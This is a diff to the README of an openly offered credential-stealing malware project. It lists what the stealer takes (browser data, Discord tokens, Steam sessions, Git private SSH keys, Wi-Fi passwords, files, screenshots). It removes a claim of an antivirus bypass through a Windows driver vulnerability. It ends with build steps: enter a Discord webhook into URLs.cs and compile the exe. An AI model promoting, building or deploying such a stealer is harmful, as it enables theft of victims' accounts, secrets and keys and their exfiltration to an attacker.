@@ -11,12 +11,11 @@ __*This stealer stealing:*__
 - **Spotify accounts**
 - **Potentially important files**
 - **Screenshot**
-- **Browsers (Brave, yandex, chrome)**
-- **Discord tokens (from desktop version and from browsers)**
+- **Browsers (Brave, Microsoft Edge, chrome)**
+- **Discord tokens**
 - **Steam session**
 - **Git private openssh keys**
-
-__This stealer have the newest antivirus bypass (u can see it in directory "Security Bypass". Its an exploit what using Driver vulnerability in windows what allows killing antivirus processes__
+- **Wifi passwords**
 
 ### How do use it?
 **Open URLs.cs and in line webhhok enter your discord webhook , build the exe, and that's it! It's that simple, yeah?**
